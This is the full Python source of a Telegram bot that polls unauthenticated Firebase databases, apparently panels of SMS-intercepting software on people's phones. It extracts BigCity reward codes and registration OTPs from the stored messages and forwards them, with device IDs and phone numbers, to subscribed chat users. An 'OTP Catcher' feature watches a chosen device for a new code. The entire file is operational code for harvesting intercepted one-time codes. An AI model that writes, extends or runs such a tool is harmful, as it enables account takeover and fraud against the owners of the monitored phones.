"""
BigCity Firebase Monitor Bot
"""
import asyncio
import json
import os
import re
import sys
import time
import logging
import httpx
from datetime import datetime
from pathlib import Path
from urllib.parse import urlparse

from telegram import (
    InlineKeyboardButton, InlineKeyboardMarkup,
    ReplyKeyboardMarkup, Update,
)
from telegram.ext import (
    Application, CallbackQueryHandler, CommandHandler,
    ContextTypes, MessageHandler, filters,
)

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
STATE_FILE  = Path(__file__).parent / "bot_state.json"
USERS_FILE  = Path(__file__).parent / "users.json"
PANELS_FILE = Path(__file__).parent / "panels.json"

IS_INITIALIZED = False
MAX_CONCURRENT = 30
semaphore = asyncio.Semaphore(MAX_CONCURRENT)
OTP_WATCH_SECONDS = 300
API_TIMEOUT = 8
MONITOR_INTERVAL = 12

REWARD_PATTERN = re.compile(r"Reward\s*Code\s*(?:is|:)\s*([A-Z0-9]{6,20})", re.IGNORECASE)
OTP_PATTERN    = re.compile(r"OTP\s*to\s*register\s*(?:is|:)\s*(\d{4,8})", re.IGNORECASE)
BIGCITY_HINT   = re.compile(r"big\s*city", re.IGNORECASE)

def load_json(path, default):
    try:
        if path.exists():
            with open(path) as f:
                return json.load(f)
    except Exception as e:
        logger.error(f"load {path}: {e}")
    return default

def save_json(path, data):
    try:
        with open(path, "w") as f:
            json.dump(data, f, indent=2)
    except Exception as e:
        logger.error(f"save {path}: {e}")

def load_panels(): return load_json(PANELS_FILE, {})
def save_panels(p): save_json(PANELS_FILE, p)
def load_state(): return load_json(STATE_FILE, {})
def save_state(s): save_json(STATE_FILE, s)
def load_users(): return load_json(USERS_FILE, [])
def save_users(u): save_json(USERS_FILE, list(set(u)))

def add_user(cid: int):
    u = load_users()
    if cid not in u:
        u.append(cid); save_users(u)
    return u

def parse_firebase_link(link: str):
    try:
        p = urlparse(link.strip())
        host = p.netloc.lower()
        if "firebaseio.com" not in host and "firebasedatabase.app" not in host:
            return None
        return f"{p.scheme}://{p.netloc}".rstrip("/")
    except Exception:
        return None

async def api_get(client, url, timeout=API_TIMEOUT):
    async with semaphore:
        try:
            r = await client.get(url, timeout=timeout)
            if r.status_code == 200:
                return r.json(), None
            return None, f"HTTP {r.status_code}"
        except Exception as e:
            return None, str(e)[:80]

def is_device_id(k: str) -> bool:
    if not isinstance(k, str): return False
    if k.lower() in {"messages","clients","devices","users","all_devices",
                      "nodes","settings","sms","logs","status","info"}:
        return False
    return 6 <= len(k) <= 60

async def discover_structure(client, base):
    root, _ = await api_get(client, f"{base}/.json?shallow=true", 8)
    if not isinstance(root, dict):
        return None, None
    keys = list(root.keys())
    if any(is_device_id(k) for k in keys):
        msg = ""
        for c in ("messages","sms","logs"):
            if c in keys: msg = c; break
        return "", msg
    for c in ("clients","devices","users","all_devices","nodes"):
        if c in keys:
            sub, _ = await api_get(client, f"{base}/{c}.json?shallow=true", 8)
            if isinstance(sub, dict) and any(is_device_id(k) for k in sub.keys()):
                msg = c
                for m in ("messages","sms","logs"):
                    if m in keys: msg = m; break
                return c, msg
    return None, None

def device_is_online(d: dict) -> bool:
    if not isinstance(d, dict): return False
    for f in ("online","isOnline","active","connected"):
        if f in d:
            v = d[f]
            if isinstance(v, bool): return v
            if isinstance(v, str):
                if v.lower() in ("true","online","1","yes"): return True
                if v.lower() in ("false","offline","0","no"): return False
    for f in ("status","state","connection"):
        if f in d and isinstance(d[f], str):
            s = d[f].lower()
            if any(x in s for x in ("online","active","connected")): return True
            if any(x in s for x in ("offline","inactive","disconnect")): return False
    now = time.time() * 1000
    for f in ("lastSeen","lastActive","last_seen","last_active","timestamp","updatedAt"):
        if f in d:
            v = d[f]; ts = None
            if isinstance(v, (int, float)): ts = v if v > 1e12 else v * 1000
            elif isinstance(v, str) and v.isdigit():
                n = int(v); ts = n if n > 1e12 else n * 1000
            if ts and (now - ts) < 5 * 60 * 1000: return True
    for n in ("webhookEvent","info","details","deviceInfo"):
        if n in d and isinstance(d[n], dict):
            if device_is_online(d[n]): return True
    return False

def _extract_number(d: dict) -> str:
    for f in ("number","phoneNumber","phone","fromNumber","sim_number","to"):
        if f in d and d[f]: return str(d[f])
    for n in ("webhookEvent","info","details"):
        if n in d and isinstance(d[n], dict):
            x = _extract_number(d[n])
            if x: return x
    return ""

async def fetch_online_devices(client, base, dev_node):
    path = f"/{dev_node}" if dev_node else ""
    data, _ = await api_get(client, f"{base}{path}.json", 15)
    if not isinstance(data, dict): return []
    out = []
    for did, dd in data.items():
        if not is_device_id(did) or not isinstance(dd, dict): continue
        if not device_is_online(dd): continue
        out.append((did, _extract_number(dd)))
    return out

async def fetch_last_messages(client, base, msg_node, dev_id, limit=6):
    path = f"/{msg_node}" if msg_node else ""
    url = f'{base}{path}/{dev_id}.json?orderBy="%24key"&limitToLast={limit}'
    data, _ = await api_get(client, url, 10)
    return data if isinstance(data, dict) else {}

def classify_bigcity(text: str):
    if not text or not BIGCITY_HINT.search(text):
        return None, None
    m = REWARD_PATTERN.search(text)
    if m: return "reward", m.group(1)
    m = OTP_PATTERN.search(text)
    if m: return "otp", m.group(1)
    return None, None

def extract_sender_time(md: dict):
    sender = "Unknown"
    for f in ("sender","from","address","number","fromNumber"):
        if f in md and md[f]: sender = str(md[f]); break
    dt = md.get("dateTime", md.get("time", md.get("timestamp","")))
    if isinstance(dt, (int, float)):
        try:
            dt = datetime.fromtimestamp(dt/1000 if dt>1e12 else dt).strftime("%Y-%m-%d %H:%M:%S")
        except Exception: dt = str(dt)
    return sender, str(dt)

def extract_text(md: dict):
    for f in ("message","body","text","msg","SMS","content"):
        if f in md and md[f]: return str(md[f])
    return ""

def fmt_reward(panel, did, num, sender, dt, code, msg, token):
    btn = InlineKeyboardMarkup([[
        InlineKeyboardButton("🎯 OTP Catcher (5 min)", callback_data=f"otp|{token}")
    ]])
    txt = (
        "🎉 *BigCity Reward Code*\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📱 *Panel:* {panel}\n"
        f"📲 *Device:* `{did}`\n"
        f"🔢 *Number:* `{num or 'N/A'}`\n"
        f"📨 *Sender:* {sender}\n"
        f"⏰ *Time:* {dt}\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🎁 *Reward Code:* `{code}`\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📄 {msg}\n"
    )
    return txt, btn

def fmt_otp(panel, did, num, sender, dt, otp, msg):
    return (
        "🔐 *BigCity OTP*\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📱 *Panel:* {panel}\n"
        f"📲 *Device:* `{did}`\n"
        f"🔢 *Number:* `{num or 'N/A'}`\n"
        f"📨 *Sender:* {sender}\n"
        f"⏰ *Time:* {dt}\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🔑 *OTP:* `{otp}`\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📄 {msg}\n"
    )

async def baseline_device(client, base, msg_node, dev_id, state, panel_key):
    msgs = await fetch_last_messages(client, base, msg_node, dev_id, limit=10)
    for mk, md in msgs.items():
        if not isinstance(md, dict): continue
        mid = str(md.get("id", mk))
        state[f"{panel_key}:{dev_id}:{mid}"] = True

async def process_device(client, pk, pc, did, num, state, users, app, is_new_panel):
    base = pc["base"]
    msg_node = pc.get("message_node","")
    panel = pc.get("name","Panel")
    sent = 0
    try:
        msgs = await fetch_last_messages(client, base, msg_node, did, limit=6)
        if not msgs: return 0
        for mk, md in msgs.items():
            if not isinstance(md, dict): continue
            mid = str(md.get("id", mk))
            key = f"{pk}:{did}:{mid}"
            if state.get(key): continue
            if not IS_INITIALIZED or is_new_panel:
                state[key] = True; continue
            text = extract_text(md)
            if not text:
                state[key] = True; continue
            kind, payload = classify_bigcity(text)
            if not kind:
                state[key] = True; continue
            sender, dt = extract_sender_time(md)
            if kind == "reward":
                token = f"{pk}~{did}~{int(time.time())}"
                txt, btn = fmt_reward(panel, did, num, sender, dt, payload, text, token)
                for uid in users:
                    try:
                        await asyncio.wait_for(
                            app.bot.send_message(
                                chat_id=uid, text=txt, parse_mode="Markdown",
                                reply_markup=btn, disable_web_page_preview=True,
                            ), timeout=10
                        )
                    except Exception as e:
                        logger.debug(f"send {uid}: {e}")
                sent += 1
            state[key] = True
    except Exception as e:
        logger.debug(f"process {did}: {e}")
    return sent

async def monitor_panels(context: ContextTypes.DEFAULT_TYPE):
    global IS_INITIALIZED
    app = context.application
    try:
        panels = load_panels()
        state = load_state()
        users = load_users()
        if not users and IS_INITIALIZED:
            return
        total = 0; any_init = False
        async with httpx.AsyncClient(timeout=httpx.Timeout(API_TIMEOUT)) as client:
            for pk, pc in list(panels.items()):
                base = pc.get("base")
                if not base: continue
                init_key = f"init:{pk}"
                is_new_panel = not state.get(init_key, False)
                try:
                    if pc.get("device_node") is None or pc.get("message_node") is None:
                        dn, mn = await asyncio.wait_for(
                            discover_structure(client, base), timeout=20
                        )
                        if dn is None: continue
                        pc["device_node"] = dn; pc["message_node"] = mn
                        save_panels(panels)
                    online = await asyncio.wait_for(
                        fetch_online_devices(client, base, pc.get("device_node","")),
                        timeout=25
                    )
                    if not online:
                        if is_new_panel: state[init_key] = True
                        continue
                    if is_new_panel or not IS_INITIALIZED:
                        for did, _ in online:
                            try:
                                await asyncio.wait_for(
                                    baseline_device(client, base, pc.get("message_node",""), did, state, pk),
                                    timeout=15
                                )
                            except Exception: pass
                        state[init_key] = True
                        any_init = True
                        continue
                    tasks = [
                        process_device(client, pk, pc, did, num, state, users, app, is_new_panel)
                        for did, num in online
                    ]
                    results = await asyncio.gather(*tasks, return_exceptions=True)
                    for r in results:
                        if isinstance(r, int): total += r
                except asyncio.TimeoutError:
                    logger.warning(f"panel {pk} timeout")
                except Exception as e:
                    logger.error(f"panel {pk}: {e}")
        if not IS_INITIALIZED:
            IS_INITIALIZED = True
            save_state(state)
            logger.info("Initialized. Baseline done.")
            return
        if total > 0 or any_init:
            save_state(state)
    except Exception as e:
        logger.error(f"monitor outer: {e}")

async def otp_catcher_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    try:
        await q.answer("OTP Catcher starting...")
        if not q.data.startswith("otp|"): return
        token = q.data.split("|",1)[1]
        parts = token.split("~")
        if len(parts) != 3:
            await q.edit_message_reply_markup(reply_markup=None); return
        pk, did, _ = parts
        try: await q.edit_message_reply_markup(reply_markup=None)
        except Exception: pass
        context.application.create_task(
            otp_watch(context.application, q.message.chat_id, pk, did)
        )
    except Exception as e:
        logger.error(f"otp_cb: {e}")

async def otp_watch(app, chat_id, pk, did):
    try:
        panels = load_panels()
        pc = panels.get(pk)
        if not pc:
            await app.bot.send_message(chat_id, "❌ Panel missing."); return
        base = pc["base"]; msg_node = pc.get("message_node","")
        panel = pc.get("name","Panel")
        end_at = time.time() + OTP_WATCH_SECONDS
        seen = set()
        async with httpx.AsyncClient(timeout=httpx.Timeout(API_TIMEOUT)) as client:
            first = await fetch_last_messages(client, base, msg_node, did, limit=10)
            for mk, md in first.items():
                if isinstance(md, dict):
                    seen.add(str(md.get("id", mk)))
            await app.bot.send_message(
                chat_id,
                f"🎯 *OTP Catcher active* — `{did}`\nMax 5 min, sirf naya OTP.",
                parse_mode="Markdown"
            )
            last_ping = time.time()
            while time.time() < end_at:
                try:
                    msgs = await asyncio.wait_for(
                        fetch_last_messages(client, base, msg_node, did, limit=10),
                        timeout=12
                    )
                    for mk, md in msgs.items():
                        if not isinstance(md, dict): continue
                        mid = str(md.get("id", mk))
                        if mid in seen: continue
                        seen.add(mid)
                        text = extract_text(md)
                        kind, payload = classify_bigcity(text)
                        if kind != "otp": continue
                        sender, dt = extract_sender_time(md)
                        num = ""
                        try:
                            path = f"/{pc.get('device_node','')}" if pc.get("device_node") else ""
                            dd, _ = await api_get(client, f"{base}{path}/{did}.json", 6)
                            if isinstance(dd, dict): num = _extract_number(dd)
                        except Exception: pass
                        await app.bot.send_message(
                            chat_id, fmt_otp(panel, did, num, sender, dt, payload, text),
                            parse_mode="Markdown", disable_web_page_preview=True,
                        )
                        await app.bot.send_message(
                            chat_id, f"✅ OTP aaya — watch band (`{did}`).",
                            parse_mode="Markdown"
                        )
                        return
                except Exception as e:
                    logger.debug(f"watch: {e}")
                if time.time() - last_ping > 60:
                    last_ping = time.time()
                    try:
                        await app.bot.send_message(
                            chat_id, f"⏳ OTP watch running... `{did}`",
                            parse_mode="Markdown"
                        )
                    except Exception: pass
                await asyncio.sleep(8)
            await app.bot.send_message(
                chat_id, f"⌛ OTP watch timeout (`{did}`).", parse_mode="Markdown"
            )
    except Exception as e:
        logger.error(f"otp_watch outer: {e}")

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cid = update.effective_chat.id
    add_user(cid)
    kb = ReplyKeyboardMarkup(
        [["📊 Status","📋 My Panels"],["➕ Add Panel","❌ Remove Panel"]],
        resize_keyboard=True,
    )
    await update.message.reply_text(
        "🤖 *BigCity Firebase Monitor*\n\n"
        "• Firebase URL only (no auth)\n"
        "• Bulk links: one per line\n"
        "• Sirf NAYE messages\n"
        "• Reward → number+code+msg\n"
        "• 🎯 OTP Catcher (5 min)\n\n"
        f"👤 `{cid}`",
        parse_mode="Markdown", reply_markup=kb,
    )

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        panels = load_panels(); users = load_users()
        out = "📊 *Status*\n━━━━━━━━━━━━━━━━━━━━━━\n\n"
        total = 0
        async with httpx.AsyncClient(timeout=httpx.Timeout(API_TIMEOUT)) as client:
            for pk, pc in panels.items():
                name = pc.get("name","?")
                base = pc.get("base")
                if not base:
                    out += f"*{name}* — 🔴 no url\n"; continue
                dn = pc.get("device_node")
                if dn is None:
                    try:
                        dn, mn = await asyncio.wait_for(
                            discover_structure(client, base), timeout=15
                        )
                        if dn is not None:
                            pc["device_node"]=dn; pc["message_node"]=mn
                            save_panels(panels)
                    except Exception: pass
                if dn is None:
                    out += f"*{name}* — 🔴 structure\n"; continue
                try:
                    online = await asyncio.wait_for(
                        fetch_online_devices(client, base, dn), timeout=20
                    )
                    total += len(online)
                    out += f"*{name}* — 🟢 {len(online)} online\n"
                except Exception:
                    out += f"*{name}* — 🔴 timeout\n"
        out += f"\n📦 Online: {total}\n👥 Users: {len(users)}"
        await update.message.reply_text(out, parse_mode="Markdown")
    except Exception as e:
        logger.error(f"status: {e}")
        await update.message.reply_text("❌ Status error.")

async def my_panels_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    panels = load_panels()
    if not panels:
        await update.message.reply_text("❌ Koi panel nahi."); return
    out = "📋 *Panels*\n\n"
    for i,(pk,pc) in enumerate(panels.items(),1):
        out += f"*{i}. {pc.get('name')}*\n`{pc.get('base','')[:50]}`\n\n"
    await update.message.reply_text(out, parse_mode="Markdown")

async def add_panel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["awaiting_url"] = True
    await update.message.reply_text(
        "➕ *Firebase URL(s) bhejo* — ek line ek URL.\n"
        "Example:\n`https://abc-default-rtdb.firebaseio.com`",
        parse_mode="Markdown",
    )

async def remove_panel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    panels = load_panels()
    if not panels:
        await update.message.reply_text("❌ Koi panel nahi."); return
    out = "❌ *Remove — number bhejo*\n\n"
    pl = []
    for i,(pk,pc) in enumerate(panels.items(),1):
        out += f"{i}. {pc.get('name')}\n"; pl.append(pk)
    context.user_data["awaiting_remove"] = True
    context.user_data["panels_list"] = pl
    await update.message.reply_text(out, parse_mode="Markdown")

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        text = (update.message.text or "").strip()
        if context.user_data.get("awaiting_url"):
            context.user_data["awaiting_url"] = False
            lines = [l.strip() for l in text.splitlines() if l.strip()]
            panels = load_panels()
            added = 0; failed = []
            async with httpx.AsyncClient(timeout=httpx.Timeout(API_TIMEOUT)) as client:
                for link in lines:
                    base = parse_firebase_link(link)
                    if not base:
                        failed.append(f"{link[:40]} (invalid)"); continue
                    try:
                        dn, mn = await asyncio.wait_for(
                            discover_structure(client, base), timeout=15
                        )
                    except Exception:
                        dn, mn = None, None
                    if dn is None:
                        failed.append(f"{link[:40]} (structure)"); continue
                    pid = f"p_{int(time.time())}_{added}"
                    panels[pid] = {
                        "name": f"Panel {len(panels)+1}",
                        "base": base,
                        "device_node": dn,
                        "message_node": mn,
                        "panel_url": link,
                        "added_date": datetime.now().strftime("%Y-%m-%d"),
                    }
                    added += 1
            save_panels(panels)
            msg = f"✅ {added} panel add."
            if failed: msg += "\n\n❌ Failed:\n" + "\n".join(failed[:10])
            await update.message.reply_text(msg)
            return
        if context.user_data.get("awaiting_remove"):
            context.user_data["awaiting_remove"] = False
            pl = context.user_data.get("panels_list", [])
            try:
                idx = int(text) - 1
                if 0 <= idx < len(pl):
                    panels = load_panels()
                    rm = panels.pop(pl[idx]); save_panels(panels)
                    await update.message.reply_text(f"✅ '{rm.get('name')}' removed.")
                else:
                    await update.message.reply_text("❌ Galat number.")
            except Exception:
                await update.message.reply_text("❌ Galat input.")
            return
    except Exception as e:
        logger.error(f"handle_text: {e}")

async def main():
    if not BOT_TOKEN:
        logger.error("BOT_TOKEN missing!"); sys.exit(1)
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(MessageHandler(filters.Regex(r"^(📊 Status|Status)$"), status_command))
    app.add_handler(MessageHandler(filters.Regex(r"^(📋 My Panels|My Panels)$"), my_panels_command))
    app.add_handler(MessageHandler(filters.Regex(r"^(➕ Add Panel|Add Panel)$"), add_panel_command))
    app.add_handler(MessageHandler(filters.Regex(r"^(❌ Remove Panel|Remove Panel)$"), remove_panel_command))
    app.add_handler(CallbackQueryHandler(otp_catcher_cb, pattern=r"^otp\|"))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.job_queue.run_repeating(
        monitor_panels,
        interval=MONITOR_INTERVAL,
        first=8,
        job_kwargs={"max_instances": 1, "coalesce": True, "misfire_grace_time": 10},
    )
    logger.info("Bot starting...")
    async with app:
        await app.initialize()
        await app.start()
        await app.updater.start_polling(allowed_updates=Update.ALL_TYPES)
        while True:
            await asyncio.sleep(1)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        pass
    except Exception as e:
        logger.fatal(f"Fatal: {e}")